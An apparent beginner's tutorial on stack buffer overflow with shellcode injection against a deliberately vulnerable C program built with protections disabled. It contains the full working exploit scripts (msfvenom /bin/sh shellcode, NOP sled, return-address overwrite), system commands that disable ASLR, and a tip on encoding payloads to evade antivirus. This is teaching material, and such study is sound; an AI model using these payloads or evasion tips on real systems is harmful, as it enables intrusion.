Welcome To part 2 Off Buffer Overflow tutorial, In this Part i will go over the classic shellcode injection through a buffer overflow

and again

    I Am Learning this the same as you, i may (most likely) get stuff wrong or explain stuff in the wrong way
    i am as new to this as you are
    i also just learned shellcode injection so dont except this to be in depth

    Also We Are Beginners So Lets Turn Off all memory protection mechanisms

    TURN OFF ASLR
      echo 0 > /proc/sys/kernel/randomize_va_space // This Stops the memory address's from changing everytime the program is ran

    TURN OFF DEP/NX
      When Compiling much sure to add the flags
        -z execstack

    TURN OFF STACK SMASHING PROTECTION
      Add The Comipler Flag
        -fno-stack-protection

    TURN OFF POSTION INDEPENAT EXECUTABLE
      add Comipler Flag
        -no-pie
    
    

For Starters Here Is the Source Code

    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    
    int copier(char *msg) {
    	char buffer[700];
    	strcpy(buffer, msg);
    }
    
    int main(int argc, char const *argv[])
    {
    	copier(argv[1]);
    	printf("You Are Such a Failure, OverFlow It!\n");
    	return 0;
    }

  once again we use strcpy to copy the argv[1] Input Into the Buffer Which can only hold 700-bytes
  and strcpy has 0 boundry checking
  
  As You Can See this time we have no function that spawns a shell, So Now What?
  Well We Can Inject Shellcode into the buffer then make the EIP point the shellcode so it executes it!

  WHAT IS SHELLCODE?

      A shellcode is a small piece of executable code used as a payload, 
      built to exploit vulnerabilities in a system or carry out malicious commands. 
      The name comes from the fact that the shellcode usually starts a command shell which allows the attacker to control the compromised machine.



So Lets Get to it

First We Need to know How many characters we can input to the buffer before we overflow, so create a python file and just as the first part we add
Also When Testing how Many characters, i like to go up by 100, dont just go 600 first, then 1000 next

    print("A" * 900)
Now Lets Run This and check if get a segfault
![1st](https://github.com/zevuxo1/Buffer-Overflow-Tutorial/assets/155918223/71909dea-1591-4c4c-ad01-725bdd82de1b)

and perfect we got a segfault, so we know this program is vuln
(check part 1 too see why we get a segfault)

Now Lets Create a Non-repeating Pattern 

Start GDB and run "pattern create 900"
![2nd](https://github.com/zevuxo1/Buffer-Overflow-Tutorial/assets/155918223/9a59737d-a8e6-49d4-bec9-8a60466c105b)

Now Change Your python script to print this

    print("<pattern>")
and now in gdb run the program with the python script and check what the EIP contains so we can find the Offset
![3rd](https://github.com/zevuxo1/Buffer-Overflow-Tutorial/assets/155918223/087ab872-b68e-4e5e-8c5c-89c4660fc5b3)

Perfect, We can see the EIP contains the value ABiA, Lets Use PEDA's pattern offset tool to find the exact offset
![4th](https://github.com/zevuxo1/Buffer-Overflow-Tutorial/assets/155918223/e88ab8d1-c0f2-4ce1-86fd-4b108e7589ac)

And Now We Know We can input 712 bytes till we Reach the EIP

Lets Prove This By overwriting it with 4 B's ( We Use 4 because the EIP is 4-bytes or 32 bits wide and 1 char = 1-byte)
![5th](https://github.com/zevuxo1/Buffer-Overflow-Tutorial/assets/155918223/88e931d2-f25b-4bc1-ac1f-e3d89025e97c)

Perfect, We Now Control the EIP register, So Now How does this differ from part 1? 
Well Since We Dont have a function inside the code which we can use we need to inject our own instructions for the program to run

There Are Many sites and tools for creating/getting shellcode like

    https://exploit.db
    https://shell-storm.com
But Lets Just Stick to the classic MSFVENOM, We Will Create Some Shellcode to spawn /bin/sh so we can run commands

sudo msfvenom -p linux/x86/exec -c CMD=/bin/sh AppendExit=true -e x86/alpha_mixed -f python

      MSFVENOM
        The OG Program for generating payloads
          do note every payload has been signatured into oblivion by every AV type Software so dont use it in real world problems without encrypters/encoders

      -p linux/x86/exec 
          specifies the payload to generate, in our case its just a payload to execute a specfied command

      -c CMD=/bin/sh
          specfie we want to execute the command to run /bin/sh

      AppendExit=true
          tell the program we want to include extra instructions to exit the program cleanly (Just Helps with stopping problems)

      -e x86/alpha_mixed
          This An Encoder, it encodes the payload using only letters and numbers (Stops \x00 and other bad chars which can break the shellcode)

      -f python
          display the output as python code for copying
![6th](https://github.com/zevuxo1/Buffer-Overflow-Tutorial/assets/155918223/1d31fd91-9dc5-4c98-bfae-bb7455c25728)

and perfect we have shellcode to use

Add this to your python script so it looks like

    import sys
    
    buf =  b""
    buf += b"\x89\xe0\xd9\xc6\xd9\x70\xf4\x5a\x4a\x4a\x4a\x4a"
    buf += b"\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43"
    buf += b"\x43\x37\x52\x59\x6a\x41\x58\x50\x30\x41\x30\x41"
    buf += b"\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42"  ### SHELL CODE TO RUN execve(/bin/sh)
    buf += b"\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x56"
    buf += b"\x51\x49\x59\x59\x67\x79\x71\x6e\x50\x56\x6b\x42"
    buf += b"\x48\x56\x4f\x44\x33\x75\x38\x35\x50\x51\x78\x34"
    buf += b"\x6f\x73\x52\x73\x59\x70\x6e\x4c\x49\x6a\x43\x4a"
    buf += b"\x6d\x6d\x50\x55\x61\x4b\x6b\x42\x4a\x45\x51\x32"
    buf += b"\x78\x48\x4d\x6b\x30\x41\x41"


Now Just to add some room for error we will create a NOP Slide, what this is, is just a series of no operation commands
so we have a landing pad for the EIP which will then go down the no operation slide till it reaches our shellcode to execute
So Update Your Python script to reflect this

Also We Need To Add a Padding Of Bytes So we Can Reach the EIP register We Can Simply just subtract the Offset By the length of the Nop and the Length Of the Shellcode

    import sys
    ## EIP OFFSET = 712
    
    buf =  b""
    buf += b"\x89\xe0\xd9\xc6\xd9\x70\xf4\x5a\x4a\x4a\x4a\x4a"
    buf += b"\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43"
    buf += b"\x43\x37\x52\x59\x6a\x41\x58\x50\x30\x41\x30\x41"
    buf += b"\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42"  ### SHELL CODE TO RUN execve(/bin/sh)
    buf += b"\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x56"
    buf += b"\x51\x49\x59\x59\x67\x79\x71\x6e\x50\x56\x6b\x42"
    buf += b"\x48\x56\x4f\x44\x33\x75\x38\x35\x50\x51\x78\x34"
    buf += b"\x6f\x73\x52\x73\x59\x70\x6e\x4c\x49\x6a\x43\x4a"
    buf += b"\x6d\x6d\x50\x55\x61\x4b\x6b\x42\x4a\x45\x51\x32"
    buf += b"\x78\x48\x4d\x6b\x30\x41\x41"

    nop = "\x90" * 450 ### Can Be Any Number But i Just do about halfway to be safe
    padding = "\x41" * (712 - len(nop) - len(buf))
    eip = "1234" ### Just a Place Holder

    ### Now Lets Print it for inputting into the program
    attack = nop + buf + padding + eip
    print(attack)

Perfect Our Script Is Almost Ready, Now All We Need is An address for the EIP to jump too

First Set a Breakpoint Just After the strcpy call so we can inspect the registers after
![7th](https://github.com/zevuxo1/Buffer-Overflow-Tutorial/assets/155918223/9f86c13a-3eb7-4dff-9c69-94fde9134fd7)

Now Run the program with the script we created so we can find an address
  gdb-peda$ run $(python2 arg.py)

And The Debugger Should hit the breakpoint and pause the program, Now We can Inspect the values of memory
run the command "x/500x $esp"

    x
      examain memory

    500x
        show 500 address in hexadecimal format

    $esp
        Show Them Starting from ESP and up

      so all up it prints 500 hexadecimal address's and their values starting from the ESP register
![8th](https://github.com/zevuxo1/Buffer-Overflow-Tutorial/assets/155918223/b0a40859-1f75-4aa0-9047-e64ed251f829)

In The Picture We Can Now See Our 450 bytes of no operation values, then after that our shellcode, and then our padding then finally our "1234" in hexadecimal ASCII codes

Now What we Need To Do is choose a address that points to our NO OP Values so it can slide down it to our shellcode (Do You See why its called a NOP Slide Now)

So Choose and address around the middle (Try Not to Choose one with 00, 10, 30 As it could break the exploit)

So From These Ones ( These Are The Address's Next To The nop values)

    0xffffc980
    0xffffc990
    0xffffc9a0
    0xffffc9b0
    0xffffc9c0
    0xffffc9d0
    0xffffc9e0
    0xffffc9f0
    0xffffca00
    0xffffca10
    0xffffca20
    0xffffca30
    0xffffca40
    0xffffca50
    0xffffca60
    0xffffca70
    0xffffca80
    0xffffca90
    0xffffcaa0
    0xffffcab0
    0xffffcac0
    0xffffcad0
    0xffffcae0
    0xffffcaf0
    0xffffcb00
    0xffffcb10
    0xffffcb20
    0xffffcb30

Im Going to Choose "0xffffca20", So Add Whatever Value to your python script in the EIP variable

REMEMBER

    Since This a x86 program make sure to reverse the address since x86 is little endian
    so "0xffffca20" Becomes "\x20\xca\xff\xff"

The Finished Script Should Look Like 

    ## EIP OFFSET = 712
    buf =  b""
    buf += b"\x89\xe0\xd9\xc6\xd9\x70\xf4\x5a\x4a\x4a\x4a\x4a"
    buf += b"\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43"
    buf += b"\x43\x37\x52\x59\x6a\x41\x58\x50\x30\x41\x30\x41"
    buf += b"\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42"  ### SHELL CODE TO RUN execve(/bin/sh)
    buf += b"\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x56"
    buf += b"\x51\x49\x59\x59\x67\x79\x71\x6e\x50\x56\x6b\x42"
    buf += b"\x48\x56\x4f\x44\x33\x75\x38\x35\x50\x51\x78\x34"
    buf += b"\x6f\x73\x52\x73\x59\x70\x6e\x4c\x49\x6a\x43\x4a"
    buf += b"\x6d\x6d\x50\x55\x61\x4b\x6b\x42\x4a\x45\x51\x32"
    buf += b"\x78\x48\x4d\x6b\x30\x41\x41"
    
    nop = "\x90" * 450 ### Can Be Any Number But i Just do about halfway to be safe
    padding = "\x41" * (712 - len(nop) - len(buf)) ## Calculate How Many A's We Need to reach the EIP
    eip = "\x20\xca\xff\xff" ### Address pointing to the NOP slide
    ## 0xffffca20
    
    ### Now Lets Print it for inputting into the program
    attack = nop + buf + padding + eip
    print(attack)

Now For the Moment Of Truth! Lets See If we succesfully injected shellcode and exploited this program

![last](https://github.com/zevuxo1/Buffer-Overflow-Tutorial/assets/155918223/797d5dd8-8f49-4934-aca4-86f15c9de253)

And it Worked!!! 


NOTE

    Im Using Python2 For using the exploit because python3 handles hex values differntly And it wont work
    So Below Is the code updated For Working On Python3

Python3 Code

    ## EIP OFFSET = 712
    
    import sys
    
    buf =  b""
    buf += b"\x89\xe0\xd9\xc6\xd9\x70\xf4\x5a\x4a\x4a\x4a\x4a"
    buf += b"\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43"
    buf += b"\x43\x37\x52\x59\x6a\x41\x58\x50\x30\x41\x30\x41"
    buf += b"\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42"  ### SHELL CODE TO RUN execve(/bin/sh)
    buf += b"\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x56"
    buf += b"\x51\x49\x59\x59\x67\x79\x71\x6e\x50\x56\x6b\x42"
    buf += b"\x48\x56\x4f\x44\x33\x75\x38\x35\x50\x51\x78\x34"
    buf += b"\x6f\x73\x52\x73\x59\x70\x6e\x4c\x49\x6a\x43\x4a"
    buf += b"\x6d\x6d\x50\x55\x61\x4b\x6b\x42\x4a\x45\x51\x32"
    buf += b"\x78\x48\x4d\x6b\x30\x41\x41"
    
    nop = b"\x90" * 450 ### Can Be Any Number But i Just do about halfway to be safe
    padding = b"\x41" * (712 - len(nop) - len(buf))
    eip = b"\x20\xca\xff\xff" ### Just a Place Holder
    ## 0xffffca20
    
    ### Now Lets Print it for inputting into the program
    attack = nop + buf + padding + eip
    
    sys.stdout.buffer.write(attack)


![last2](https://github.com/zevuxo1/Buffer-Overflow-Tutorial/assets/155918223/68089e7b-dca8-42f8-8961-e4e8e569e903)










  
